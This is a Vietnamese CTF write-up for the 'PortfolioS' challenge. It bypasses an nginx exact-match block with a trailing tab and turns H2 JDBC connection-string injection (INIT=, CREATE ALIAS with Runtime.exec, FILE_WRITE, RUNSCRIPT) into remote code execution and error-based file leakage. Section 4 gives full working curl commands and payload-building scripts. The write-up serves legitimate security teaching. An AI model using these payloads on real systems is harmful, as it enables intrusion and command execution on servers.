---
title: PortfolioS

---

# PortfolioS 
![image](https://hackmd.io/_uploads/Hk5zfaOCee.png)

Challenge file: [public.zip](https://drive.google.com/file/d/1g-ZEzFmsgxozcKSScCvevPqiFS4w4Bgh/view)

## 1) Phân tích challenge 
### 1.1 Kiến trúc (Docker Compose + mạng)
- Hệ thống có 2 service:
  - **app**: Spring Boot (Tomcat embedded)
  - **nginx**: reverse proxy expose cổng **8989** ra host, `proxy_pass http://app:8989`.
  - Mọi truy cập từ ngoài đi **qua nginx** rồi mới tới app.

![image](https://hackmd.io/_uploads/rkTvGp_Rle.png)
![image](https://hackmd.io/_uploads/SJ4OMad0el.png)
![image](https://hackmd.io/_uploads/Syu_Gp_Rle.png)
![image](https://hackmd.io/_uploads/r1ZEET_0xg.png)
![image](https://hackmd.io/_uploads/H1oMNauCgl.png)


### 1.2 Nginx chặn exact-match
```nginx
location = /internal/testConnection { return 403; }
location / { proxy_pass http://app:8989; }
```
- Dùng **exact match** (`=`) → chỉ chặn đúng chuỗi `/internal/testConnection`.
- Nếu path có **ký tự rác** ở cuối (vd: tab `%09`) thì **không match** và bị proxy vào backend.
- **Tomcat normalize** URL → trả về đường dẫn gốc `/internal/testConnection` trước khi vào Spring.

### 1.3 portfolio.war
- Controller/route: `/login`, `/register`, `/dashboard`, `/dashboard/save`, **`/internal/testConnection`**.
- `application.properties`:
  ```
  spring.datasource.url=jdbc:h2:mem:ctfdb;DB_CLOSE_DELAY=-1
  spring.datasource.driver-class-name=org.h2.Driver
  server.port=8989
  ```
- **InternalController** (rút từ bytecode/strings + template):
  - Endpoint /internal/testConnection có lỗ hổng JDBC Injection vì ghép trực tiếp username/password vào chuỗi kết nối:
    ```
    String fullUrl = baseUrl + "USER=" + username + ";PASSWORD=" + password + ";";
    Connection conn = DriverManager.getConnection(fullUrl);
- Và xử lý lỗi lộ thông tin:
    ``` 
    catch (Exception e) {
    model.addAttribute("error", "Connection failed: " + e.getMessage() + " | URL: " + fullUrl);
    }
    ```

### 1.4 Dockerfile (giấu flag)
- `flag.txt` được **đổi tên ngẫu nhiên**:
  ```bash
  RAND_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
  mv /flag.txt "/${RAND_NAME}" && rm -f /flag.txt
  ```
- Nên **phải liệt kê `/`** để biết tên file flag thực tế.


## 2) Phân tích lỗ hổng
### Lỗi #1 — Nginx Reverse Proxy Bypass
- `location =` chỉ chặn **chuỗi y hệt**.
- Gửi `POST /internal/testConnection%09` → Nginx **không chặn**, Tomcat **normalize** về `/internal/testConnection` → Spring xử lý.

- ai đia: thêm ký tự trắng (tab) vào path để bypass Nginx, Tomcat sẽ sửa về path chuẩn.

### Lỗi #2 — H2 JDBC Connection String Injection → RCE
- H2 hỗ trợ **`INIT=<SQL>`** khi mở kết nối.
- Ứng dụng ghép thẳng input vào JDBC URL → có thể chèn:  
  `;DB_CLOSE_DELAY=-1;INIT=<SQL>`
- Khả năng:
  - Tạo bảng tạm, nối payload **từng ký tự** (`CHAR(n)`) để vượt giới hạn.
  - `CALL FILE_WRITE(text,path)` ghi text ra file.
  - `RUNSCRIPT FROM 'path'` thực thi script H2.
  - `CREATE ALIAS ... AS $$ Java $$` → `Runtime.getRuntime().exec(...)` → **RCE**.

### Lỗi #3 — Error-based exfil (render `e.getMessage()`)
- Ép H2 `RUNSCRIPT FROM` một **file thường** → H2 ném lỗi **kèm nội dung file**.
- Ứng dụng render nguyên thông điệp lỗi → **lộ nội dung file**.


## 3) Ý tưởng khai thác

1. Login lấy `JSESSIONID` (nếu cần).
2. **Bypass** Nginx: `POST /internal/testConnection%09`.
3. **Giữ H2 sống**: dùng `DB_CLOSE_DELAY=-1`.
4. **JDBC injection** qua `password`:
   - Tạo bảng tạm → ghép payload RCE từng ký tự → `FILE_WRITE` ra `/tmp/rce` → `RUNSCRIPT` chạy.
5. Với RCE:
   - `ls / > /tmp/ls` để lấy **tên flag** thực tế.
   - `cat /<RANDOMNAME> > /tmp/flag`.
6. **Exfil** qua lỗi: `RUNSCRIPT FROM '/tmp/flag'` → flag in ra HTML.


## 4) Khai thác (chi tiết, có lệnh mẫu)

> Host: `http://localhost:8989/`, đã có `JSESSIONID=<SESSION>`.

### 4.1 Bypass nhanh
```bash
curl -i "http://localhost:8989/internal/testConnection%09"   -H "Cookie: JSESSIONID=<SESSION>"
```

### 4.2 Tạo bảng tạm & seed
```bash
curl -s "http://localhost:8989/internal/testConnection%09"   -H "Cookie: JSESSIONID=<SESSION>"   -H "Content-Type: application/x-www-form-urlencoded"   --data-raw 'username=a&password=a;DB_CLOSE_DELAY=-1;INIT=CREATE TABLE X(d VARCHAR)'

curl -s "http://localhost:8989/internal/testConnection%09"   -H "Cookie: JSESSIONID=<SESSION>" -H "Content-Type: application/x-www-form-urlencoded"   --data-raw 'username=a&password=a;DB_CLOSE_DELAY=-1;INIT=INSERT INTO X VALUES('"'"'CREATE '"'"')'
```

### 4.3 Ghép payload 1 (liệt kê `/`)
```java
ALIAS SHELL AS $$void shell()throws Exception{
  Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","ls / > /tmp/ls"});
}$$;CALL SHELL();
```
Sinh ASCII và append:
```bash
python3 - <<'PY'
p='''ALIAS SHELL AS $$void shell()throws Exception{
Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","ls / > /tmp/ls"});
}$$;CALL SHELL();'''
for ch in p: print(ord(ch))
PY

# Append từng ký tự:
while read -r c; do
  curl -s "http://localhost:8989/internal/testConnection%09"     -H "Cookie: JSESSIONID=<SESSION>"     -H "Content-Type: application/x-www-form-urlencoded"     --data-raw "username=a&password=a;DB_CLOSE_DELAY=-1;INIT=UPDATE X SET d = d || CHAR(${c})" >/dev/null
done < <(python3 - <<'PY'
p='''ALIAS SHELL AS $$void shell()throws Exception{
Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","ls / > /tmp/ls"});
}$$;CALL SHELL();'''
for ch in p: print(ord(ch))
PY
)
```

### 4.4 Ghi & chạy script
```bash
curl -s "http://localhost:8989/internal/testConnection%09"   -H "Cookie: JSESSIONID=<SESSION>"   -H "Content-Type: application/x-www-form-urlencoded"   --data-raw "username=a&password=a;DB_CLOSE_DELAY=-1;INIT=CALL FILE_WRITE((SELECT d FROM X LIMIT 1), '/tmp/rce')"

curl -s "http://localhost:8989/internal/testConnection%09"   -H "Cookie: JSESSIONID=<SESSION>"   -H "Content-Type: application/x-www-form-urlencoded"   --data-raw "username=a&password=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM '/tmp/rce'"
```

### 4.5 Leak danh sách `/` (error-based)
```bash
resp=$(curl -s "http://localhost:8989/internal/testConnection%09"   -H "Cookie: JSESSIONID=<SESSION>"   -H "Content-Type: application/x-www-form-urlencoded"   --data-raw "username=a&password=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM '/tmp/ls'")

echo "$resp" | sed -n 's/.*Connection failed: \(.*\) | URL:.*//p'
# → tìm tên flag 16 ký tự chữ+số, ví dụ: Qb7f4s2Kc8Y1Z0Pd
```

### 4.6 Payload 2 (đọc flag) & exfil
```java
ALIAS SHELL AS $$void shell()throws Exception{
  Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","cat /Qb7f4s2Kc8Y1Z0Pd > /tmp/flag"});
}$$;CALL SHELL();
```
Lặp lại bước ghép/ghi/chạy như trên (có thể dùng bảng `Y(d)`), rồi:
```bash
curl -s "http://localhost:8989/internal/testConnection%09"   -H "Cookie: JSESSIONID=<SESSION>"   -H "Content-Type: application/x-www-form-urlencoded"   --data-raw "username=a&password=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM '/tmp/flag'"
```

Response thành công sẽ trả về 
``` java
HTTP/1.1 200 OK
...
<div th:if="${error}" class="alert alert-danger">
    Connection failed: Syntax error in SQL statement "CSCV2025{Fake_flag}"; expected... | URL: jdbc:h2:mem:testdb;MODE=MySQL;INIT=CREATE SCHEMA IF NOT EXISTS testdb;USER=a;PASSWORD=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM '/tmp/shaaa';
</div>
```

## References Và Tài Liệu Tham Khảo

H2 Docs: https://h2database.com/html/features.html#init (INIT param).
Tomcat URL Normalization: https://tomcat.apache.org/tomcat-9.0-doc/config/http.html.
CWE List: https://cwe.mitre.org/.
